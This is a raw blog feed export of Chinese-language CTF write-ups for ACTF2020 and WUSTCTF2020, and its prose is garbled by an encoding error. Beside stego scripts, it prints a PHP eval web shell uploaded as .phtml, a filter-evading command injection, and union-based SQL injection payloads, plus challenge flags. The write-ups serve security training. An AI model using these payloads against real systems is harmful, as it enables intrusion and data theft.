<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¦æ»¡è¶³æ˜¯æ•°å­—ä¸”çš„<code>$key == $str</code>å› ä¸ºphpä¸­stringè½¬intæ—¶ä¼šåªä¿ç•™æ•°å­—ï¼Œä»¤<code>key=123</code>å³å¯</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/4.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p>JSå‰ç«¯éªŒè¯ã€phæ‰©å±•åç»•è¿‡</p>
<p>æœ¬æ¥ä»¥ä¸ºè¦ç»•è¿‡å‰ç«¯éªŒè¯ï¼Œä¼ .htaccessçš„å‘ç°å®ƒä¼šè‡ªåŠ¨åŠ ä¸ªå‰ç¼€ï¼Œæ— æ³•å®ç°è§£æåŠŸèƒ½ï¼Œç„¶åè¯•ç€ä¼ äº†phç±»çš„ä¸œè¥¿ï¼Œå‘ç°phtmlå¯ä»¥ä¼ ä¸Šå»</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="60%" height="60%" data-src="/2020/04/13/ACTF2020/5.png" src="/img/loading.gif" class="lazyload"></a>

<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload_file&quot;; filename&#x3D;&quot;1.phtml&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php eval($_REQUEST[&#39;pass&#39;]);?&gt;</span><br></pre></td></tr></table></figure></div>

<p>èšå‰‘è¿ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p>
<p>index.phpçš„æºç ï¼Œçœ‹åˆ°è¿‡æ»¤äº†phpã€php345ï¼Œè¿˜æœ‰åŠ äº†ä¸ªmd5çš„å‰ç¼€</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span></span><br><span class="line">	define(<span class="string">"UPLOAD_PATH"</span>, <span class="string">"./uplo4d"</span>);</span><br><span class="line">	$msg = <span class="string">"Upload Success!"</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line">        <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>])) &#123;</span><br><span class="line">	        <span class="keyword">exit</span>(<span class="string">'nonono~ Bad fileï¼'</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">        $new_file_name = md5($file_name).<span class="string">"."</span>.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'Upload Failed!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;div style="color:#F00"&gt;'</span>.$msg.<span class="string">" Look here~ "</span>.$img_path.<span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°.htaccessæ–‡ä»¶çš„å†…å®¹å°±æ˜¯è§£æphtmlä¸ºå¯æ‰§è¡Œphpæ–‡ä»¶</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.phtml$&gt;</span><br><span class="line">	SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="base64éšå†™"><a href="#base64éšå†™" class="headerlink" title="base64éšå†™"></a>base64éšå†™</h3><p>é¢˜ç›®=è§£é¢˜æ–¹æ³•</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">bin_str=<span class="string">''</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stego.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">	<span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">		stegb64=<span class="string">""</span>.join(line.split())</span><br><span class="line">		rowb64=<span class="string">""</span>.join(str(base64.b64encode(base64.b64decode(stegb64)),<span class="string">'utf-8'</span>).split())</span><br><span class="line">		offset=abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>])-b64chars.index(rowb64.replace(<span class="string">'='</span>, <span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">		equalnum=line.count(<span class="string">'='</span>)</span><br><span class="line">		<span class="keyword">if</span> equalnum:</span><br><span class="line">			bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">	print(<span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(bin_str),<span class="number">8</span>)]))</span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œè„šæœ¬å¾—åˆ°flagï¼š<code>ACTF{6aseb4_f33!}</code></p>
<h3 id="NTFSæ•°æ®æµ"><a href="#NTFSæ•°æ®æµ" class="headerlink" title="NTFSæ•°æ®æµ"></a>NTFSæ•°æ®æµ</h3><p>ä¸‹è½½è§£å‹åå‘ç°500ä¸ªtxtï¼Œç¬¬293ä¸‰ä¸ªæ˜æ˜¾ä¸åŒ</p>
<p>æ‹¿<code>NtfsStreamsEditor2.exe</code>å¯¼å‡ºä¸€ä¸‹å¾—åˆ°flagï¼š<code>ACTF{AAAds_nntfs_ffunn?}</code> </p>
<h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><p>Outguessã€å›¾ç‰‡å±æ€§ã€ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼ç¼–ç </p>
<p>å›¾ç‰‡å±æ€§é‡Œæœ‰ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼ç¼–ç ï¼Œè§£ç åå¾—åˆ°keyï¼šabc</p>
<p>Outguessè§£ä¸€ä¸‹å›¾ç‰‡å³å¯å¾—åˆ°flag</p>
<h3 id="swp"><a href="#swp" class="headerlink" title="swp"></a>swp</h3><p>å¯¼å‡ºhttpå¯¹è±¡ã€ä¼ªåŠ å¯†ã€stringsä¸€ä¸‹ï¼ˆæˆ–è€…vim -r</p>
<p>wiresharkå¯¼å‡ºhttpå¯¹è±¡ï¼Œç„¶å010æ”¹ä¸€ä¸‹ä¼ªåŠ å¯†ï¼Œå¾—åˆ°.flag.swpï¼Œstringsè¾“å‡ºå¾—åˆ°flagï¼Œæˆ–è€…vim -ræ¢å¤ä¸€ä¸‹swpæ–‡ä»¶å¾—åˆ°flagï¼š<code>actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/13/ACTF2020/6.png" src="/img/loading.gif" class="lazyload"></a>

<h3 id="æ˜æ–‡æ”»å‡»"><a href="#æ˜æ–‡æ”»å‡»" class="headerlink" title="æ˜æ–‡æ”»å‡»"></a>æ˜æ–‡æ”»å‡»</h3><p>æ–‡ä»¶åˆ†ç¦»ã€æ˜æ–‡æ”»å‡»</p>
<p>æŠŠwoo.jpgé‡Œé¢çš„å‹ç¼©åŒ…åˆ†ç¦»å‡ºæ¥ï¼Œç„¶åæ ¹æ®è¿™ä¸¤ä¸ªå‹ç¼©åŒ…è¿›è¡Œæ˜æ–‡æ”»å‡»</p>
<p>å¾—åˆ°flagï¼š<code>ACTF{3te9_nbb_ahh8}</code></p>
<h3 id="å‰‘é¾™"><a href="#å‰‘é¾™" class="headerlink" title="å‰‘é¾™"></a>å‰‘é¾™</h3><p>aaencodeã€å±æ€§ã€steghideã€desã€stegosauruséšå†™</p>
<p>å°†<code>pwd.txt</code>é‡Œé¢çš„é¢œæ–‡å­—è§£ç å¾—åˆ°ï¼š<code>welcom3!</code>ï¼Œç„¶åå°†å…¶ä½œä¸ºå¯†é’¥ï¼Œè§£å‡º<code>hh.jpg</code>çš„steghideçš„éšå†™</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">steghide.exe extract -sf hh.jpg</span><br><span class="line">Enter passphrase:welcom3!</span><br><span class="line">wrote extracted data to &quot;secret.txt&quot;.</span><br><span class="line"></span><br><span class="line">secret.txt:</span><br><span class="line">æƒ³è¦flagå—ï¼Ÿè§£å‡ºæˆ‘çš„å¯†æ–‡å§~</span><br><span class="line">U2FsdGVkX1&#x2F;7KeHVl5984OsGUVSanPfPednHpK9lKvp0kdrxO4Tj&#x2F;Q&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨<code>hh.jpg</code>å±æ€§é‡Œæ‰¾åˆ°å¯†é’¥ï¼š<code>@#$%^&amp;%%$)</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/13/ACTF2020/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>æç¤ºstegosauruséšå†™ï¼Œå…¶å®ç›´æ¥file O_Oå°±å¯ä»¥å¾—åˆ°<code>O_O: python 3.6 byte-compiled</code>ä¹Ÿèƒ½çŒœåˆ°pyc</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;stegosaurus -x O_O.pyc</span><br><span class="line">Extracted payload: flag&#123;3teg0Sauru3_!1&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="frequency"><a href="#frequency" class="headerlink" title="frequency"></a>frequency</h3><p>éšè—æ–‡å­—å’Œå±æ€§è¿èµ·æ¥base64ã€å­—é¢‘ç»Ÿè®¡</p>
<p>u1s1ï¼Œè¿™é¢˜å’‹çŒœåˆ°è¿èµ·æ¥çš„ã€‚ã€‚å°†ä¸¤æ®µbase64è¿èµ·æ¥å­—é¢‘ç»Ÿè®¡åå¾—åˆ°</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&#39;a&#39;, &#39;c&#39;, &#39;t&#39;, &#39;f&#39;, &#39;p&#39;, &#39;l&#39;, &#39;o&#39;, &#39;k&#39;, &#39;m&#39;, &#39;i&#39;, &#39;j&#39;, &#39;n&#39;, &#39;u&#39;, &#39;h&#39;, &#39;b&#39;, &#39;y&#39;, &#39;g&#39;, &#39;v&#39;, &#39;r&#39;, &#39;d&#39;, &#39;x&#39;, &#39;e&#39;, &#39;s&#39;, &#39;z&#39;, &#39;w&#39;, &#39;q&#39;, &#39;&#125;&#39;, &#39;&#123;&#39;, &#39;_&#39;, &#39;^&#39;, &#39;]&#39;, &#39;[&#39;, &#39;Z&#39;, &#39;Y&#39;, &#39;X&#39;, &#39;W&#39;, &#39;V&#39;, &#39;U&#39;, &#39;T&#39;, &#39;S&#39;, &#39;R&#39;, &#39;Q&#39;, &#39;P&#39;, &#39;O&#39;, &#39;N&#39;, &#39;M&#39;, &#39;L&#39;, &#39;K&#39;, &#39;J&#39;, &#39;I&#39;, &#39;H&#39;, &#39;G&#39;, &#39;F&#39;, &#39;E&#39;, &#39;D&#39;, &#39;C&#39;, &#39;B&#39;, &#39;A&#39;, &#39;@&#39;, &#39;&#x3D;&#39;, &#39;9&#39;, &#39;8&#39;, &#39;7&#39;, &#39;6&#39;, &#39;5&#39;, &#39;4&#39;, &#39;3&#39;, &#39;2&#39;, &#39;1&#39;, &#39;0&#39;, &#39;-&#39;, &#39;+&#39;, &#39;*&#39;, &#39;)&#39;, &#39;(&#39;, &#39;&amp;&#39;, &#39;%&#39;, &#39;$&#39;, &#39;#&#39;, &#39;!&#39;, &#39; &#39;]</span><br></pre></td></tr></table></figure></div>

<p>æ”¾ä¸€ä¸‹è„šæœ¬ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">alphabet = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =&#123;&#125;[]"</span></span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">data = f.read()</span><br><span class="line">result = &#123;d:<span class="number">0</span> <span class="keyword">for</span> d <span class="keyword">in</span> alphabet&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sort_by_value</span><span class="params">(d)</span>:</span></span><br><span class="line">    items = d.items()</span><br><span class="line">    backitems = [[v[<span class="number">1</span>],v[<span class="number">0</span>]] <span class="keyword">for</span> v <span class="keyword">in</span> items]</span><br><span class="line">    backitems.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> [ backitems[i][<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(backitems))]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">for</span> alpha <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">if</span> d == alpha:</span><br><span class="line">            result[alpha] = result[alpha] + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">print(sort_by_value(result))</span><br></pre></td></tr></table></figure></div>

<h3 id="music"><a href="#music" class="headerlink" title="music"></a>music</h3><p>æ–‡ä»¶å¼‚æˆ–</p>
<p>æœ‰å¤§é‡A1å‡ºç°ï¼Œæœ¬åº”è¯¥æ˜¯00çš„æ‰€ä»¥æ•´ä¸ªæ–‡ä»¶äºA1è¿›è¡Œå¼‚æˆ–å¾—åˆ°åŸæœ¬mp4æ–‡ä»¶</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/13/ACTF2020/8.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ”¶å¬éŸ³é¢‘å¾—åˆ°flag</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>WUSTCTF2020</title>
    <url>/2020/04/02/WUSTCTF2020/</url>
    <content><![CDATA[<!--çœ‹ä¸ä¸‹å»èµ„æ–™å‘€ï¼ŒwebåŸºç¡€çŸ¥è¯†ä¹Ÿå­¦ä¸ä¸‹å»å‘€ï¼Œå”‰ï¼Œå…ˆé¢å‘é¢˜ç›®å­¦ä¹ å§-->

<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="æœ´å®æ— å"><a href="#æœ´å®æ— å" class="headerlink" title="æœ´å®æ— å"></a>æœ´å®æ— å</h3><p>robotsåè®®ã€HTTPå¤´ã€ç®€å•bypass</p>
<p>çœ‹ç½‘é¡µæ ‡é¢˜ï¼Œæš—ç¤ºæŸ¥çœ‹<code>robots.txt</code>ï¼Œåœ¨é‡Œé¢å‘ç°<code>fAke_f1agggg.php</code></p>
<p>è®¿é—®åF12ï¼ŒæŸ¥çœ‹åˆ°httpå¤´ä¸­æœ‰ä¸€é¡¹<code>Look_at_me: /fl4g.php</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html;charset=utf-8'</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123; </span><br><span class="line">    $num = $_GET[<span class="string">'num'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;"</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//level 2 </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'md5'</span>]))&#123; </span><br><span class="line">   $md5=$_GET[<span class="string">'md5'</span>]; </span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5)) </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;"</span>; </span><br><span class="line">   <span class="keyword">else</span> </span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²"</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag </span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'get_flag'</span>]))&#123; </span><br><span class="line">    $get_flag = $_GET[<span class="string">'get_flag'</span>]; </span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">" "</span>))&#123; </span><br><span class="line">        $get_flag = str_ireplace(<span class="string">"cat"</span>, <span class="string">"wctf2020"</span>, $get_flag); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;"</span>; </span><br><span class="line">        system($get_flag); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"å¿«åˆ°éæ´²äº†"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"å»éæ´²å§"</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>intval()å‡½æ•°å¯ä»¥ç”¨åå…­è¿›åˆ¶ç­‰äº0ï¼Œintval($num + 1)ä¼šå¼ºåˆ¶è½¬åŒ–æ¥ç»•è¿‡</p>
<p>$md5==md5($md5)è¿™ä¸ªéœ€è¦çˆ†ç ´å‡ºæ¥ä¸€ä¸ª0eå¼€å¤´çš„md5åŠ å¯†åè¿˜æ˜¯0eå¼€å¤´çš„å­—ç¬¦ä¸²ï¼ˆç™¾åº¦ä¹Ÿè¡Œ</p>
<p>å®˜æ–¹wpé‚£é‡Œå«–æ¥çš„è„šæœ¬ï¼ˆ<a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-24-solves" target="_blank" rel="noopener">52HeRtz</a>ï¼‰</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">global</span> dict_az</span><br><span class="line">	dict_az = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		result = <span class="string">'0e'</span></span><br><span class="line">		result += str(i)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line">		hashed_s = hashlib.md5(result.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">		r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line">		<span class="keyword">if</span> r:</span><br><span class="line">			print(<span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(result, hashed_s))</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> i % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">			print(<span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(result, str(i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] found! md5( 0e215962017 ) ---&gt; 0e291242476940776845150308577824</span></span><br></pre></td></tr></table></figure></div>

<p>ç»•è¿‡åï¼Œ<code>get_flag=ls</code>çœ‹ä¸€ä¸‹éƒ½æœ‰å•¥æ–‡ä»¶ï¼Œå‘ç°flagæ–‡ä»¶<code>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></p>
<p>è¿‡æ»¤äº†ç©ºæ ¼ã€catã€wctf2020ï¼Œå¯ä»¥æ„é€ <code>get_flag=ca\t${IFS}flll*</code>ï¼Œå¾—åˆ°flag</p>
<h3 id="é¢œå€¼æˆç»©æŸ¥è¯¢"><a href="#é¢œå€¼æˆç»©æŸ¥è¯¢" class="headerlink" title="é¢œå€¼æˆç»©æŸ¥è¯¢"></a>é¢œå€¼æˆç»©æŸ¥è¯¢</h3><p>æ•´æ•°å‹æ³¨å…¥ï¼Œè¿‡æ»¤äº†ç©ºæ ¼å’Œunionï¼Œsqlmapçš„UA</p>
<p>ç”¨/**/ä»£æ›¿ç©ºæ ¼ï¼ŒåŒå†™unionç»•è¿‡:ununionion</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">çŒœåˆ—</span><br><span class="line">1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;3</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(schema_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.schemata</span><br><span class="line">æŸ¥è¡¨</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;</span><br><span class="line">æŸ¥åˆ—</span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;</span><br><span class="line"></span><br><span class="line">-1&#x2F;**&#x2F;ununionion&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(value)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctf.flag</span><br></pre></td></tr></table></figure></div>

<h3 id="CV-Maker"><a href="#CV-Maker" class="headerlink" title="CV Maker"></a>CV Maker</h3><p>æ³¨å†Œã€ç™»å½•åï¼Œæ–‡ä»¶ä¸Šä¼ ç»•è¿‡exif_imagetype()å°±å¥½ï¼ŒåŠ ä¸ªæ–‡ä»¶å¤´GIF89a</p>
